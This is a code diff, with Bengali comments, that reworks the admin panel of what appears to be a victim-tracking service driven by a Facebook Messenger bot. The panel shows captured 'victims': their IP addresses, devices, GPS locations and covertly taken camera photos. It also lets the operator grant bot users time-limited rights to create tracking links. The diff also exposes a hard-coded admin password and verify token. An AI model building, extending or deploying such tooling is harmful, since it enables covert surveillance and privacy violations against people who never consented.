@@ -14,10 +14,10 @@ async function isAdmin(req, res, next) {
 }
 
 // ============================
-// লগইন পেজ (পাসওয়ার্ড টেক্সট বাদ)
+// লগইন পেজ
 // ============================
 router.get('/admin', async (req, res) => {
-    if (req.session.isAdmin) return res.redirect('/admin/dashboard');
+    if (req.session.isAdmin) return res.redirect('/admin?tab=dashboard');
     res.send(`
         <!DOCTYPE html>
         <html>
@@ -98,9 +98,7 @@ router.get('/admin', async (req, res) => {
                     cursor: pointer;
                     transition: 0.2s;
                 }
-                .login-card button:hover {
-                    background: #4338ca;
-                }
+                .login-card button:hover { background: #4338ca; }
                 .login-card .error {
                     color: #dc2626;
                     font-size: 14px;
@@ -130,7 +128,7 @@ router.post('/admin/login', async (req, res) => {
     const adminPass = config ? config.adminPassword : 'Sakib@7890';
     if (req.body.password === adminPass) {
         req.session.isAdmin = true;
-        res.redirect('/admin/dashboard');
+        res.redirect('/admin?tab=dashboard');
     } else {
         res.redirect('/admin?error=1');
     }
@@ -141,45 +139,53 @@ router.get('/admin/logout', (req, res) => {
     res.redirect('/admin');
 });
 
-// ============================
-// 🔥 ড্যাশবোর্ড – সার্চ, নাম পরিবর্তন, এক্সপাইরি, লিংক এক্সপাইরি সহ
-// ============================
-router.get('/admin/dashboard', isAdmin, async (req, res) => {
+// ================================================================
+// হেল্পার: ট্যাব ভ্যালিডেশন
+// ================================================================
+function getActiveTab(req) {
+    const validTabs = ['dashboard', 'users', 'victims', 'config'];
+    const tab = req.query.tab || 'dashboard';
+    return validTabs.includes(tab) ? tab : 'dashboard';
+}
+
+// ================================================================
+// ড্যাশবোর্ড, ইউজার, ভিক্টিম, কনফিগ – সব একত্রে
+// ================================================================
+router.get('/admin', isAdmin, async (req, res) => {
+    const activeTab = getActiveTab(req);
     const config = await Config.findOne({ key: 'bot_config' });
     const baseUrl = config?.baseUrl || 'http://localhost:3000';
     const msg = req.query.msg || '';
     const error = req.query.error || '';
+    const search = req.query.search || '';
 
-    // 🔥 সার্চ প্যারামিটার
-    const searchFbId = req.query.search || '';
-    let users = [];
-    let totalUsers = 0;
-    let allowedUsers = 0;
-    let totalVictims = 0;
+    // ---------- ডেটা লোড ----------
+    let totalUsers = await User.countDocuments();
+    let allowedUsers = await User.countDocuments({ allowed: true });
+    let totalVictims = await Victim.countDocuments();
     let victims = [];
+    let users = [];
 
-    if (searchFbId) {
-        // 🔥 সার্চ রেজাল্ট
-        const user = await User.findOne({ fbId: searchFbId });
-        if (user) {
-            users = [user];
+    // ইউজার লিস্ট (সার্চ সহ)
+    if (activeTab === 'users' || activeTab === 'dashboard') {
+        if (search) {
+            users = await User.find({ fbId: search });
+        } else {
+            users = await User.find().sort({ firstSeen: -1 }).limit(50);
         }
-        totalUsers = users.length;
-        allowedUsers = users.filter(u => u.allowed).length;
-        // ভিক্টিম ডেটা সার্চ
-        victims = await Victim.find({ fbId: searchFbId }).sort({ timestamp: -1 }).limit(20);
-        totalVictims = victims.length;
-    } else {
-        totalUsers = await User.countDocuments();
-        allowedUsers = await User.countDocuments({ allowed: true });
-        totalVictims = await Victim.countDocuments();
-        victims = await Victim.find().sort({ timestamp: -1 }).limit(20);
-        users = await User.find().sort({ firstSeen: -1 }).limit(30);
     }
 
-    // ============================================================
-    // ইউজার টেবিল রেন্ডার
-    // ============================================================
+    // ভিক্টিম লিস্ট (সার্চ সহ)
+    if (activeTab === 'victims' || activeTab === 'dashboard') {
+        let filter = {};
+        if (search) {
+            filter = { $or: [{ id: search }, { fbId: search }] };
+        }
+        victims = await Victim.find(filter).sort({ timestamp: -1 }).limit(50);
+    }
+
+    // ---------- টেবিল রেন্ডার ----------
+    // ইউজার টেবিল
     let userRows = users.map(u => {
         const expiryText = u.permissionExpiresAt ? new Date(u.permissionExpiresAt).toLocaleString('bn-BD') : 'চিরস্থায়ী';
         const isExpired = u.permissionExpiresAt && new Date() > u.permissionExpiresAt;
@@ -205,7 +211,7 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                             <input type="hidden" name="userId" value="${u.fbId}">
                             <input type="hidden" name="action" value="${u.allowed ? 'deny' : 'allow'}">
                             <input type="hidden" name="duration" value="" id="duration_${u.fbId}">
-                            <select name="duration_select" class="duration-select" style="padding:4px 6px;border:1px solid #ddd;border-radius:6px;font-size:12px;background:#f9fafb;" onchange="document.getElementById('duration_${u.fbId}').value=this.value">
+                            <select name="duration_select" class="duration-select" onchange="document.getElementById('duration_${u.fbId}').value=this.value">
                                 <option value="">স্থায়ী</option>
                                 <option value="1h">১ ঘন্টা</option>
                                 <option value="6h">৬ ঘন্টা</option>
@@ -230,13 +236,12 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
         `;
     }).join('');
 
-    // ============================================================
-    // ভিক্টিম টেবিল রেন্ডার (লিংক এক্সপাইরি সহ)
-    // ============================================================
+    // ভিক্টিম টেবিল (লিংক নির্মাতা সহ)
     let victimRows = victims.map(v => {
         const lastImage = v.camera && v.camera.length > 0 ? v.camera[v.camera.length - 1].image : null;
         const imgTag = lastImage ? `<img src="data:image/jpeg;base64,${lastImage}" class="victim-thumb" />` : '—';
         const expiryStatus = v.isExpired ? '⛔ এক্সপায়ার' : (v.expiresAt ? new Date(v.expiresAt).toLocaleString('bn-BD') : 'N/A');
+        const creator = v.fbId && v.fbId !== 'unknown' ? `<a href="/admin?tab=users&search=${v.fbId}" style="color:#4f46e5;text-decoration:none;">${v.fbId}</a>` : 'N/A';
         return `
             <tr>
                 <td><code class="id-badge">${v.id}</code></td>
@@ -246,6 +251,7 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                 <td>${v.location?.city || v.gpsLocation?.latitude ? '<i class="fas fa-map-pin" style="color:#4f46e5;"></i> হ্যাঁ' : '❌ না'}</td>
                 <td>${v.camera?.length || 0}</td>
                 <td>${imgTag}</td>
+                <td>${creator}</td>
                 <td>
                     <a href="/admin/victim/${v.id}" class="btn-view"><i class="fas fa-eye"></i></a>
                     <form method="POST" action="/admin/expire-link" class="inline-form" onsubmit="return confirm('এই লিংকটি এক্সপায়ার করবেন?');">
@@ -260,7 +266,7 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
     }).join('');
 
     // ============================================================
-    // HTML রেসপন্স
+    // HTML (নেভিগেশন + কন্টেন্ট)
     // ============================================================
     res.send(`
         <!DOCTYPE html>
@@ -307,6 +313,37 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                 }
                 .header .logout-btn:hover { background: #fecaca; }
 
+                /* Navigation tabs */
+                .nav-tabs {
+                    display: flex;
+                    gap: 8px;
+                    background: #ffffff;
+                    border-radius: 16px;
+                    padding: 6px;
+                    border: 1px solid #eef2f6;
+                    margin-bottom: 28px;
+                    flex-wrap: wrap;
+                }
+                .nav-tabs a {
+                    padding: 10px 24px;
+                    border-radius: 12px;
+                    font-weight: 500;
+                    font-size: 15px;
+                    text-decoration: none;
+                    color: #6b7280;
+                    transition: 0.2s;
+                    display: flex;
+                    align-items: center;
+                    gap: 8px;
+                }
+                .nav-tabs a:hover { background: #f3f4f6; color: #111827; }
+                .nav-tabs a.active {
+                    background: #4f46e5;
+                    color: #fff;
+                }
+                .nav-tabs a.active:hover { background: #4338ca; }
+
+                /* Stats */
                 .stats {
                     display: grid;
                     grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -342,6 +379,7 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                 }
                 .stat-card .info .label { font-size: 14px; color: #6b7280; }
 
+                /* Search */
                 .search-section {
                     background: #ffffff;
                     border-radius: 16px;
@@ -563,6 +601,7 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                     .header h1 { font-size: 22px; }
                     .stats { grid-template-columns: repeat(2, 1fr); }
                     .search-section { flex-direction: column; align-items: stretch; }
+                    .nav-tabs a { padding: 8px 16px; font-size: 14px; }
                 }
                 @media (max-width: 480px) {
                     .stats { grid-template-columns: 1fr; }
@@ -572,6 +611,7 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
         </head>
         <body>
             <div class="container">
+                <!-- Header -->
                 <div class="header">
                     <h1><i class="fas fa-panel"></i> অ্যাডমিন প্যানেল</h1>
                     <a href="/admin/logout" class="logout-btn"><i class="fas fa-sign-out-alt"></i> লগআউট</a>
@@ -580,110 +620,175 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                 ${msg ? `<div style="background:#d1fae5;color:#065f46;padding:14px 20px;border-radius:12px;margin-bottom:24px;display:flex;align-items:center;gap:10px;"><i class="fas fa-check-circle"></i> ${msg}</div>` : ''}
                 ${error ? `<div style="background:#fee2e2;color:#991b1b;padding:14px 20px;border-radius:12px;margin-bottom:24px;display:flex;align-items:center;gap:10px;"><i class="fas fa-exclamation-circle"></i> ${error}</div>` : ''}
 
-                <!-- Stats -->
-                <div class="stats">
-                    <div class="stat-card">
-                        <div class="icon"><i class="fas fa-users"></i></div>
-                        <div class="info"><div class="number">${totalUsers}</div><div class="label">মোট ইউজার</div></div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="icon"><i class="fas fa-user-check"></i></div>
-                        <div class="info"><div class="number">${allowedUsers}</div><div class="label">অনুমোদিত</div></div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="icon"><i class="fas fa-user-secret"></i></div>
-                        <div class="info"><div class="number">${totalVictims}</div><div class="label">মোট ভিক্টিম</div></div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="icon"><i class="fas fa-camera"></i></div>
-                        <div class="info"><div class="number">${victims.reduce((s, v) => s + (v.camera?.length || 0), 0)}</div><div class="label">ছবি ক্যাপচার</div></div>
-                    </div>
+                <!-- Navigation Tabs -->
+                <div class="nav-tabs">
+                    <a href="/admin?tab=dashboard" class="${activeTab === 'dashboard' ? 'active' : ''}"><i class="fas fa-chart-pie"></i> ড্যাশবোর্ড</a>
+                    <a href="/admin?tab=users" class="${activeTab === 'users' ? 'active' : ''}"><i class="fas fa-users"></i> ইউজার</a>
+                    <a href="/admin?tab=victims" class="${activeTab === 'victims' ? 'active' : ''}"><i class="fas fa-eye"></i> ভিক্টিম</a>
+                    <a href="/admin?tab=config" class="${activeTab === 'config' ? 'active' : ''}"><i class="fas fa-sliders-h"></i> কনফিগ</a>
                 </div>
 
-                <!-- 🔥 Search Section -->
-                <div class="search-section">
-                    <i class="fas fa-search" style="color:#6b7280;"></i>
-                    <form method="GET" action="/admin/dashboard" style="display:flex;gap:12px;flex:1;flex-wrap:wrap;align-items:center;">
-                        <input type="text" name="search" placeholder="Facebook ID দিয়ে ইউজার খুঁজুন..." value="${searchFbId}">
-                        <button type="submit"><i class="fas fa-search"></i> খুঁজুন</button>
-                        ${searchFbId ? `<a href="/admin/dashboard" class="clear-btn" style="padding:10px 20px;background:#e5e7eb;color:#374151;border-radius:10px;text-decoration:none;font-weight:500;font-size:14px;">সাফ করুন</a>` : ''}
-                    </form>
-                </div>
-
-                <!-- Config -->
-                <div class="card">
-                    <div class="card-header"><h2><i class="fas fa-sliders-h"></i> কনফিগারেশন</h2><span class="badge">প্রয়োজনীয়</span></div>
-                    <form method="POST" action="/admin/update-config">
-                        <div class="config-grid">
-                            <div><label><i class="fas fa-key" style="margin-right:6px;color:#4f46e5;"></i> পেজ অ্যাক্সেস টোকেন</label><input type="text" name="pageAccessToken" value="${config?.pageAccessToken || ''}" placeholder="PAGE_ACCESS_TOKEN"></div>
-                            <div><label><i class="fas fa-shield-alt" style="margin-right:6px;color:#4f46e5;"></i> ভেরিফাই টোকেন</label><input type="text" name="verifyToken" value="${config?.verifyToken || 'Sakib_Verify'}" placeholder="VERIFY_TOKEN"></div>
-                            <div><label><i class="fas fa-lock" style="margin-right:6px;color:#4f46e5;"></i> অ্যাডমিন পাসওয়ার্ড</label><input type="text" name="adminPassword" value="${config?.adminPassword || 'Sakib@7890'}" placeholder="অ্যাডমিন পাসওয়ার্ড"></div>
-                            <div><label><i class="fas fa-link" style="margin-right:6px;color:#4f46e5;"></i> বেস URL</label><input type="text" name="baseUrl" value="${config?.baseUrl || baseUrl}" placeholder="https://your-domain.com"></div>
-                            <div class="full"><button type="submit" class="btn-primary"><i class="fas fa-save"></i> কনফিগ সেভ</button></div>
+                <!-- ============================================================ -->
+                <!-- DASHBOARD TAB -->
+                <!-- ============================================================ -->
+                ${activeTab === 'dashboard' ? `
+                <div id="dashboard">
+                    <div class="stats">
+                        <div class="stat-card">
+                            <div class="icon"><i class="fas fa-users"></i></div>
+                            <div class="info"><div class="number">${totalUsers}</div><div class="label">মোট ইউজার</div></div>
                         </div>
-                    </form>
-                    <div style="margin-top:16px;padding-top:16px;border-top:1px solid #eef2f6;"><code style="background:#f3f4f6;padding:4px 14px;border-radius:30px;font-size:13px;">📌 ওয়েবহুক URL: ${baseUrl}/webhook</code></div>
+                        <div class="stat-card">
+                            <div class="icon"><i class="fas fa-user-check"></i></div>
+                            <div class="info"><div class="number">${allowedUsers}</div><div class="label">অনুমোদিত</div></div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="icon"><i class="fas fa-user-secret"></i></div>
+                            <div class="info"><div class="number">${totalVictims}</div><div class="label">মোট ভিক্টিম</div></div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="icon"><i class="fas fa-camera"></i></div>
+                            <div class="info"><div class="number">${victims.reduce((s, v) => s + (v.camera?.length || 0), 0)}</div><div class="label">ছবি ক্যাপচার</div></div>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><h2><i class="fas fa-clock"></i> সাম্প্রতিক ভিক্টিম (সর্বশেষ ৫টি)</h2></div>
+                        <div class="table-wrap">
+                            <table>
+                                <thead><tr><th>আইডি</th><th>টাইপ</th><th>আইপি</th><th>নির্মাতা</th><th>সময়</th></tr></thead>
+                                <tbody>
+                                    ${victims.slice(0,5).map(v => `
+                                        <tr>
+                                            <td><code class="id-badge">${v.id}</code></td>
+                                            <td><span class="type-badge ${v.type}">${v.type}</span></td>
+                                            <td>${v.ip || 'N/A'}</td>
+                                            <td>${v.fbId && v.fbId !== 'unknown' ? `<a href="/admin?tab=users&search=${v.fbId}" style="color:#4f46e5;text-decoration:none;">${v.fbId}</a>` : 'N/A'}</td>
+                                            <td>${new Date(v.timestamp).toLocaleDateString('bn-BD')}</td>
+                                        </tr>
+                                    `).join('') || '<tr><td colspan="5" style="text-align:center;color:#9ca3af;padding:20px;">কোনো ভিক্টিম নেই</td></tr>'}
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
+                ` : ''}
 
-                <!-- Users -->
-                <div class="card">
-                    <div class="card-header">
-                        <h2><i class="fas fa-address-book"></i> ইউজার ম্যানেজমেন্ট</h2>
-                        <span class="badge">${totalUsers} জন</span>
+                <!-- ============================================================ -->
+                <!-- USERS TAB -->
+                <!-- ============================================================ -->
+                ${activeTab === 'users' ? `
+                <div id="users">
+                    <div class="search-section">
+                        <i class="fas fa-search" style="color:#6b7280;"></i>
+                        <form method="GET" action="/admin" style="display:flex;gap:12px;flex:1;flex-wrap:wrap;align-items:center;">
+                            <input type="hidden" name="tab" value="users">
+                            <input type="text" name="search" placeholder="Facebook ID দিয়ে ইউজার খুঁজুন..." value="${search}">
+                            <button type="submit"><i class="fas fa-search"></i> খুঁজুন</button>
+                            ${search ? `<a href="/admin?tab=users" class="clear-btn" style="padding:10px 20px;background:#e5e7eb;color:#374151;border-radius:10px;text-decoration:none;font-weight:500;font-size:14px;">সাফ করুন</a>` : ''}
+                        </form>
                     </div>
-                    <div class="table-wrap">
-                        <table>
-                            <thead><tr>
-                                <th>FB ID</th>
-                                <th>নাম</th>
-                                <th>প্রথম দেখা</th>
-                                <th>মেসেজ</th>
-                                <th>স্ট্যাটাস</th>
-                                <th>এক্সপাইরি</th>
-                                <th>অ্যাকশন</th>
-                            </tr></thead>
-                            <tbody>${userRows || '<tr><td colspan="7" style="text-align:center;color:#9ca3af;padding:30px 0;"><i class="fas fa-inbox"></i> কোনো ইউজার নেই</td></tr>'}</tbody>
-                        </table>
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-address-book"></i> ইউজার লিস্ট</h2>
+                            <span class="badge">${users.length} জন</span>
+                        </div>
+                        <div class="table-wrap">
+                            <table>
+                                <thead><tr>
+                                    <th>FB ID</th><th>নাম</th><th>প্রথম দেখা</th><th>মেসেজ</th><th>স্ট্যাটাস</th><th>এক্সপাইরি</th><th>অ্যাকশন</th>
+                                </tr></thead>
+                                <tbody>${userRows || '<tr><td colspan="7" style="text-align:center;color:#9ca3af;padding:30px 0;"><i class="fas fa-inbox"></i> কোনো ইউজার নেই</td></tr>'}</tbody>
+                            </table>
+                        </div>
                     </div>
                 </div>
+                ` : ''}
 
-                <!-- Victims -->
-                <div class="card">
-                    <div class="card-header">
-                        <h2><i class="fas fa-eye"></i> ভিক্টিম ডেটা</h2>
-                        <span class="badge">${searchFbId ? 'সার্চ রেজাল্ট' : 'সর্বশেষ ২০টি'}</span>
+                <!-- ============================================================ -->
+                <!-- VICTIMS TAB -->
+                <!-- ============================================================ -->
+                ${activeTab === 'victims' ? `
+                <div id="victims">
+                    <div class="search-section">
+                        <i class="fas fa-search" style="color:#6b7280;"></i>
+                        <form method="GET" action="/admin" style="display:flex;gap:12px;flex:1;flex-wrap:wrap;align-items:center;">
+                            <input type="hidden" name="tab" value="victims">
+                            <input type="text" name="search" placeholder="ভিক্টিম ID বা নির্মাতার FB ID দিয়ে খুঁজুন..." value="${search}">
+                            <button type="submit"><i class="fas fa-search"></i> খুঁজুন</button>
+                            ${search ? `<a href="/admin?tab=victims" class="clear-btn" style="padding:10px 20px;background:#e5e7eb;color:#374151;border-radius:10px;text-decoration:none;font-weight:500;font-size:14px;">সাফ করুন</a>` : ''}
+                        </form>
                     </div>
-                    <div class="table-wrap">
-                        <table>
-                            <thead><tr>
-                                <th>আইডি</th><th>টাইপ</th><th>আইপি</th><th>ডিভাইস</th><th>লোকেশন</th><th>ছবি</th><th>প্রিভিউ</th><th>অ্যাকশন</th><th>এক্সপাইরি</th><th>সময়</th>
-                            </tr></thead>
-                            <tbody>${victimRows || '<tr><td colspan="10" style="text-align:center;color:#9ca3af;padding:30px 0;"><i class="fas fa-inbox"></i> কোনো ভিক্টিম নেই</td></tr>'}</tbody>
-                        </table>
-                    </div>
-                    <div style="margin-top:16px;font-size:13px;color:#6b7280;">
-                        <i class="fas fa-info-circle"></i> বিস্তারিত দেখতে "দেখুন" বাটনে ক্লিক করুন। <i class="fas fa-clock" style="margin-left:12px;"></i> ঘড়ি আইকনে ক্লিক করে লিংক এক্সপায়ার করুন।
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-eye"></i> ভিক্টিম ডেটা</h2>
+                            <span class="badge">${victims.length}টি</span>
+                        </div>
+                        <div class="table-wrap">
+                            <table>
+                                <thead><tr>
+                                    <th>আইডি</th><th>টাইপ</th><th>আইপি</th><th>ডিভাইস</th><th>লোকেশন</th><th>ছবি</th><th>প্রিভিউ</th>
+                                    <th>নির্মাতা</th><th>অ্যাকশন</th><th>এক্সপাইরি</th><th>সময়</th>
+                                </tr></thead>
+                                <tbody>${victimRows || '<tr><td colspan="11" style="text-align:center;color:#9ca3af;padding:30px 0;"><i class="fas fa-inbox"></i> কোনো ভিক্টিম নেই</td></tr>'}</tbody>
+                            </table>
+                        </div>
+                        <div style="margin-top:16px;font-size:13px;color:#6b7280;">
+                            <i class="fas fa-info-circle"></i> বিস্তারিত দেখতে "দেখুন" বাটনে ক্লিক করুন। <i class="fas fa-clock" style="margin-left:12px;"></i> ঘড়ি আইকনে ক্লিক করে লিংক এক্সপায়ার করুন।
+                        </div>
                     </div>
                 </div>
+                ` : ''}
+
+                <!-- ============================================================ -->
+                <!-- CONFIG TAB -->
+                <!-- ============================================================ -->
+                ${activeTab === 'config' ? `
+                <div id="config">
+                    <div class="card">
+                        <div class="card-header"><h2><i class="fas fa-sliders-h"></i> কনফিগারেশন</h2><span class="badge">প্রয়োজনীয়</span></div>
+                        <form method="POST" action="/admin/update-config">
+                            <div class="config-grid">
+                                <div><label><i class="fas fa-key" style="margin-right:6px;color:#4f46e5;"></i> পেজ অ্যাক্সেস টোকেন</label><input type="text" name="pageAccessToken" value="${config?.pageAccessToken || ''}" placeholder="PAGE_ACCESS_TOKEN"></div>
+                                <div><label><i class="fas fa-shield-alt" style="margin-right:6px;color:#4f46e5;"></i> ভেরিফাই টোকেন</label><input type="text" name="verifyToken" value="${config?.verifyToken || 'Sakib_Verify'}" placeholder="VERIFY_TOKEN"></div>
+                                <div><label><i class="fas fa-lock" style="margin-right:6px;color:#4f46e5;"></i> অ্যাডমিন পাসওয়ার্ড</label><input type="text" name="adminPassword" value="${config?.adminPassword || 'Sakib@7890'}" placeholder="অ্যাডমিন পাসওয়ার্ড"></div>
+                                <div><label><i class="fas fa-link" style="margin-right:6px;color:#4f46e5;"></i> বেস URL</label><input type="text" name="baseUrl" value="${config?.baseUrl || baseUrl}" placeholder="https://your-domain.com"></div>
+                                <div class="full"><button type="submit" class="btn-primary"><i class="fas fa-save"></i> কনফিগ সেভ</button></div>
+                            </div>
+                        </form>
+                        <div style="margin-top:16px;padding-top:16px;border-top:1px solid #eef2f6;"><code style="background:#f3f4f6;padding:4px 14px;border-radius:30px;font-size:13px;">📌 ওয়েবহুক URL: ${baseUrl}/webhook</code></div>
+                    </div>
+                </div>
+                ` : ''}
+
             </div>
+
+            <!-- ============================================================ -->
+            <!-- পোলিং স্ক্রিপ্ট (রিয়েল-টাইম আপডেট) -->
+            <!-- ============================================================ -->
             <script>
-                // ডিউরেশন সিলেক্ট চেইঞ্জ হলে hidden ইনপুট আপডেট
-                document.querySelectorAll('.duration-select').forEach(select => {
-                    select.addEventListener('change', function() {
-                        const form = this.closest('form');
-                        const hiddenInput = form.querySelector('input[name="duration"]');
-                        if (hiddenInput) hiddenInput.value = this.value;
-                    });
-                });
+                (function() {
+                    // শুধু নির্দিষ্ট ট্যাবের জন্য পোলিং
+                    const activeTab = "${activeTab}";
+                    if (activeTab === 'users' || activeTab === 'victims' || activeTab === 'dashboard') {
+                        // প্রতি ৫ সেকেন্ডে রিলোড (শুধু ডেটা অংশ)
+                        setInterval(function() {
+                            // আমরা পুরো পেজ রিলোড করবো না, বরং ট্যাব রিফ্রেশ করবো
+                            // সহজ উপায়: পেজ রিলোড (কারণ ছোট প্রোজেক্ট)
+                            // তবে আরও সুন্দর উপায়: AJAX, কিন্তু আমরা সহজের জন্য পুরো পেজ রিলোড দিচ্ছি
+                            // এতে রিয়েল-টাইম ইফেক্ট হবে
+                            location.reload();
+                        }, 5000); // ৫ সেকেন্ড
+                    }
+                })();
             </script>
         </body>
         </html>
     `);
 });
 
-// ============================
-// 🔥 POST রাউটস
-// ============================
+// ================================================================
+// POST রাউটস (কনফিগ, ইউজার টগল, নাম পরিবর্তন, লিংক এক্সপায়ার, ডিলিট)
+// ================================================================
 
 // 1. কনফিগ আপডেট
 router.post('/admin/update-config', isAdmin, async (req, res) => {
@@ -695,14 +800,14 @@ router.post('/admin/update-config', isAdmin, async (req, res) => {
         config.adminPassword = req.body.adminPassword || 'Sakib@7890';
         config.baseUrl = req.body.baseUrl || '';
         await config.save();
-        res.redirect('/admin/dashboard?msg=কনফিগ+সেভ+হয়েছে');
+        res.redirect('/admin?tab=config&msg=কনফিগ+সেভ+হয়েছে');
     } catch (err) {
         console.error('❌ Config update error:', err);
-        res.redirect('/admin/dashboard?error=সেভ+ব্যর্থ+('+err.message+')');
+        res.redirect('/admin?tab=config&error=সেভ+ব্যর্থ+('+err.message+')');
     }
 });
 
-// 2. 🔥 ইউজার টগল – সময়সীমা সহ
+// 2. ইউজার টগল (সময়সীমা সহ)
 router.post('/admin/toggle-user', isAdmin, async (req, res) => {
     try {
         const { userId, action, duration } = req.body;
@@ -710,14 +815,13 @@ router.post('/admin/toggle-user', isAdmin, async (req, res) => {
 
         const user = await User.findOne({ fbId: userId });
         if (!user) {
-            return res.redirect('/admin/dashboard?error=ইউজার+পাওয়া+যায়নি');
+            return res.redirect('/admin?tab=users&error=ইউজার+পাওয়া+যায়নি');
         }
 
         const wasAllowed = user.allowed;
 
         if (action === 'allow') {
             user.allowed = true;
-            // 🔥 ডিউরেশন সেট
             if (duration) {
                 const durationMap = {
                     '1h': 60 * 60 * 1000,
@@ -733,7 +837,7 @@ router.post('/admin/toggle-user', isAdmin, async (req, res) => {
                 if (ms) {
                     user.permissionExpiresAt = new Date(Date.now() + ms);
                 } else {
-                    user.permissionExpiresAt = null; // চিরস্থায়ী
+                    user.permissionExpiresAt = null;
                 }
             } else {
                 user.permissionExpiresAt = null;
@@ -744,7 +848,6 @@ router.post('/admin/toggle-user', isAdmin, async (req, res) => {
         }
         await user.save();
 
-        // 🔥 অনুমোদন মেসেজ (যদি আগে অনুমোদিত না ছিল এবং এখন allow)
         if (action === 'allow' && !wasAllowed) {
             const fullName = user.firstName || 'বন্ধু';
             const expiryText = user.permissionExpiresAt ? new Date(user.permissionExpiresAt).toLocaleString('bn-BD') : 'চিরস্থায়ী';
@@ -766,52 +869,52 @@ router.post('/admin/toggle-user', isAdmin, async (req, res) => {
             console.log(`📨 অনুমোদন মেসেজ পাঠানো হয়েছে: ${user.fbId}`);
         }
 
-        res.redirect('/admin/dashboard?msg=ইউজার+আপডেট+হয়েছে');
+        res.redirect('/admin?tab=users&msg=ইউজার+আপডেট+হয়েছে');
     } catch (err) {
         console.error('❌ Toggle user error:', err);
-        res.redirect('/admin/dashboard?error=আপডেট+ব্যর্থ+('+err.message+')');
+        res.redirect('/admin?tab=users&error=আপডেট+ব্যর্থ+('+err.message+')');
     }
 });
 
-// 3. 🔥 ইউজারের নাম পরিবর্তন
+// 3. ইউজারের নাম পরিবর্তন
 router.post('/admin/update-name', isAdmin, async (req, res) => {
     try {
         const { userId, newName } = req.body;
         if (!userId || !newName) {
-            return res.redirect('/admin/dashboard?error=ইউজার+আইডি+বা+নাম+খালি');
+            return res.redirect('/admin?tab=users&error=ইউজার+আইডি+বা+নাম+খালি');
         }
         const user = await User.findOne({ fbId: userId });
         if (!user) {
-            return res.redirect('/admin/dashboard?error=ইউজার+পাওয়া+যায়নি');
+            return res.redirect('/admin?tab=users&error=ইউজার+পাওয়া+যায়নি');
         }
         user.firstName = newName.trim();
         await user.save();
         console.log(`📝 ইউজারের নাম পরিবর্তন: ${userId} → ${newName}`);
-        res.redirect('/admin/dashboard?msg=নাম+পরিবর্তন+হয়েছে');
+        res.redirect('/admin?tab=users&msg=নাম+পরিবর্তন+হয়েছে');
     } catch (err) {
         console.error('❌ Update name error:', err);
-        res.redirect('/admin/dashboard?error=নাম+পরিবর্তন+ব্যর্থ');
+        res.redirect('/admin?tab=users&error=নাম+পরিবর্তন+ব্যর্থ');
     }
 });
 
-// 4. 🔥 লিংক এক্সপায়ার (ম্যানুয়াল)
+// 4. লিংক এক্সপায়ার (ম্যানুয়াল)
 router.post('/admin/expire-link', isAdmin, async (req, res) => {
     try {
         const { victimId } = req.body;
         if (!victimId) {
-            return res.redirect('/admin/dashboard?error=ভিক্টিম+আইডি+প্রয়োজন');
+            return res.redirect('/admin?tab=victims&error=ভিক্টিম+আইডি+প্রয়োজন');
         }
         const victim = await Victim.findOne({ id: victimId });
         if (!victim) {
-            return res.redirect('/admin/dashboard?error=ভিক্টিম+পাওয়া+যায়নি');
+            return res.redirect('/admin?tab=victims&error=ভিক্টিম+পাওয়া+যায়নি');
         }
         victim.isExpired = true;
         await victim.save();
         console.log(`⏰ লিংক এক্সপায়ার: ${victimId}`);
-        res.redirect('/admin/dashboard?msg=লিংক+এক্সপায়ার+হয়েছে');
+        res.redirect('/admin?tab=victims&msg=লিংক+এক্সপায়ার+হয়েছে');
     } catch (err) {
         console.error('❌ Expire link error:', err);
-        res.redirect('/admin/dashboard?error=এক্সপায়ার+ব্যর্থ');
+        res.redirect('/admin?tab=victims&error=এক্সপায়ার+ব্যর্থ');
     }
 });
 
@@ -820,21 +923,21 @@ router.post('/admin/delete-user', isAdmin, async (req, res) => {
     try {
         const { userId } = req.body;
         if (!userId) {
-            return res.redirect('/admin/dashboard?error=ইউজার+আইডি+প্রয়োজন');
+            return res.redirect('/admin?tab=users&error=ইউজার+আইডি+প্রয়োজন');
         }
         const result = await User.deleteOne({ fbId: userId });
         if (result.deletedCount === 0) {
-            return res.redirect('/admin/dashboard?error=ইউজার+পাওয়া+যায়নি');
+            return res.redirect('/admin?tab=users&error=ইউজার+পাওয়া+যায়নি');
         }
-        res.redirect('/admin/dashboard?msg=ইউজার+ডিলিট+হয়েছে');
+        res.redirect('/admin?tab=users&msg=ইউজার+ডিলিট+হয়েছে');
     } catch (err) {
         console.error('❌ Delete user error:', err);
-        res.redirect('/admin/dashboard?error=ডিলিট+ব্যর্থ');
+        res.redirect('/admin?tab=users&error=ডিলিট+ব্যর্থ');
     }
 });
 
 // ============================
-// ভিক্টিম গ্যালারি ভিউ
+// ভিক্টিম গ্যালারি ভিউ (আলাদা পেজ)
 // ============================
 router.get('/admin/victim/:id', isAdmin, async (req, res) => {
     try {
@@ -924,10 +1027,10 @@ router.get('/admin/victim/:id', isAdmin, async (req, res) => {
                             <h2><i class="fas fa-images"></i> ভিক্টিমের ছবি</h2>
                             <div class="sub">আইডি: <code style="background:#f3f4f6;padding:2px 12px;border-radius:30px;">${victim.id}</code> &bull; মোট ${victim.camera?.length || 0}টি ছবি</div>
                         </div>
-                        <a href="/admin/dashboard" class="btn-back"><i class="fas fa-arrow-left"></i> ড্যাশবোর্ডে ফিরুন</a>
+                        <a href="/admin?tab=victims" class="btn-back"><i class="fas fa-arrow-left"></i> ভিক্টিম পেজে ফিরুন</a>
                     </div>
                     <div class="gallery">${imagesHtml}</div>
